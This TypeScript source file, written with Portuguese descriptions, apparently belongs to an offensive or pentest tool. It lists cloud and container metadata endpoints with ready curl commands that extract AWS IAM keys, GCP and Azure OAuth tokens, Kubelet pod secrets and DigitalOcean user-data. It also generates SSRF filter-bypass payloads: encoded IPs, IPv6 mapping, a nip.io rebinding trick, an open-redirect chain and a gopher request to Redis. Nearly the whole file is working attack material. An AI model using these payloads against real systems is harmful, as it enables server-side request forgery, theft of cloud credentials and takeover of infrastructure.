export interface CloudMetadataEndpoint {
  id: string;
  provider: 'AWS' | 'GCP' | 'Azure' | 'Kubernetes' | 'Docker' | 'Oracle Cloud' | 'DigitalOcean';
  name: string;
  endpointUrl: string;
  requiredHeaders?: Record<string, string>;
  description: string;
  returnedData: string;
  severity: 'CRITICAL' | 'HIGH';
  imdsVersion: 'v1' | 'v2' | 'v1_and_v2' | 'N/A';
  curlCommand: string;
}

export const CLOUD_METADATA_DATABASE: CloudMetadataEndpoint[] = [
  {
    id: 'aws-iam-role',
    provider: 'AWS',
    name: 'AWS EC2 IAM Credentials (IMDSv1)',
    endpointUrl: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    description: 'Extrai o nome da IAM Role associada à instância EC2 sem autenticação via IMDSv1.',
    returnedData: 'Retorna o nome da Role (ex: s3-full-access-role). Uma requisição subsequente com esse nome retorna AccessKeyId, SecretAccessKey e Token de sessão.',
    severity: 'CRITICAL',
    imdsVersion: 'v1',
    curlCommand: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  },
  {
    id: 'aws-imdsv2-token',
    provider: 'AWS',
    name: 'AWS EC2 Token Flow (IMDSv2)',
    endpointUrl: 'http://169.254.169.254/latest/api/token',
    requiredHeaders: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' },
    description: 'Obtenção de token de sessão para bypass em instâncias com IMDSv2 ativo.',
    returnedData: 'Retorna o token que deve ser injetado via header X-aws-ec2-metadata-token nas requisições subsequentes.',
    severity: 'HIGH',
    imdsVersion: 'v2',
    curlCommand: 'TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/'
  },
  {
    id: 'gcp-oauth-token',
    provider: 'GCP',
    name: 'Google Cloud Platform Access Token',
    endpointUrl: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    requiredHeaders: { 'Metadata-Flavor': 'Google' },
    description: 'Extrai o token OAuth 2.0 da conta de serviço padrão do Compute Engine / GKE.',
    returnedData: '{"access_token": "ya29.c...", "expires_in": 3599, "token_type": "Bearer"}',
    severity: 'CRITICAL',
    imdsVersion: 'v1',
    curlCommand: 'curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"'
  },
  {
    id: 'azure-access-token',
    provider: 'Azure',
    name: 'Azure Managed Identity OAuth2 Token',
    endpointUrl: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
    requiredHeaders: { 'Metadata': 'true' },
    description: 'Extrai token JWT para autenticação na Azure Management REST API com privilégios da VM.',
    returnedData: '{"access_token":"eyJ0eX...", "client_id":"...", "resource":"https://management.azure.com/"}',
    severity: 'CRITICAL',
    imdsVersion: 'N/A',
    curlCommand: 'curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'
  },
  {
    id: 'k8s-kubelet',
    provider: 'Kubernetes',
    name: 'Kubernetes Unauthenticated Kubelet Read-Only',
    endpointUrl: 'http://127.0.0.1:10255/pods',
    description: 'Acessa a porta 10255 da API read-only do Kubelet para listar pods e variáveis de ambiente.',
    returnedData: 'Lista completa de pods rodando no nó com segredos passados via variáveis de ambiente.',
    severity: 'CRITICAL',
    imdsVersion: 'N/A',
    curlCommand: 'curl -s http://127.0.0.1:10255/pods'
  },
  {
    id: 'docker-api',
    provider: 'Docker',
    name: 'Docker Daemon Remote API',
    endpointUrl: 'http://127.0.0.1:2375/version',
    description: 'Consulta a API do Docker sem TLS caso a porta 2375 esteja exposta localmente.',
    returnedData: 'JSON com detalhes da engine Docker, permitindo criação remota de containers com montagem de root /.',
    severity: 'CRITICAL',
    imdsVersion: 'N/A',
    curlCommand: 'curl -s http://127.0.0.1:2375/version'
  },
  {
    id: 'do-metadata',
    provider: 'DigitalOcean',
    name: 'DigitalOcean Droplet User Data',
    endpointUrl: 'http://169.254.169.254/metadata/v1/user-data',
    description: 'Acessa scripts de inicialização (cloud-init) que frequentemente contêm senhas e chaves SSH.',
    returnedData: 'Scripts shell ou arquivos cloud-config com senhas em texto puro.',
    severity: 'HIGH',
    imdsVersion: 'N/A',
    curlCommand: 'curl -s http://169.254.169.254/metadata/v1/user-data'
  }
];

export interface SsrfBypassVariation {
  encodingName: string;
  payload: string;
  technique: string;
}

/**
 * Generates bypass variations for a target host (default: 169.254.169.254)
 */
export function generateSsrfBypasses(targetPath: string = '/latest/meta-data/'): SsrfBypassVariation[] {
  const path = targetPath.startsWith('/') ? targetPath : `/${targetPath}`;
  return [
    {
      encodingName: 'IPv4 Padrão (Literal)',
      payload: `http://169.254.169.254${path}`,
      technique: 'Formato clássico sem ofuscação'
    },
    {
      encodingName: 'Decimal / DWORD Integer',
      payload: `http://2852039166${path}`,
      technique: 'Converte 169.254.169.254 em representação decimal inteira de 32 bits'
    },
    {
      encodingName: 'Hexadecimal com Pontos',
      payload: `http://0xa9.0xfe.0xa9.0xfe${path}`,
      technique: 'Representação hexadecimal de cada octeto (0xA9 = 169, 0xFE = 254)'
    },
    {
      encodingName: 'Hexadecimal Contínuo (0xDWORD)',
      payload: `http://0xa9fea9fe${path}`,
      technique: 'Hexadecimal de 32 bits direto, contornando regex que espera pontos'
    },
    {
      encodingName: 'Octal com Zero à Esquerda',
      payload: `http://0251.0376.0251.0376${path}`,
      technique: 'Formatos octais interpretados nativamente por parsers C/glibc'
    },
    {
      encodingName: 'IPv6 Mapeado para IPv4',
      payload: `http://[::ffff:169.254.169.254]${path}`,
      technique: 'Bypass de filtros que apenas validam sintaxe IPv4'
    },
    {
      encodingName: 'DNS Rebinding / Wildcard Service',
      payload: `http://169.254.169.254.nip.io${path}`,
      technique: 'Resolve 169.254.169.254 via DNS externo contornando filtros de string'
    },
    {
      encodingName: 'Redirecionamento Aberto (Open Redirect Chain)',
      payload: `https://api.empresa.com/redirect?url=http://169.254.169.254${path}`,
      technique: 'Burla validações de hostname inicial através de HTTP 302'
    },
    {
      encodingName: 'Gopher Protocol (SSRF para Redis/SMTP)',
      payload: `gopher://127.0.0.1:6379/_INFO%0D%0A`,
      technique: 'Envio arbitrário de bytes para portas de serviços internos'
    }
  ];
}
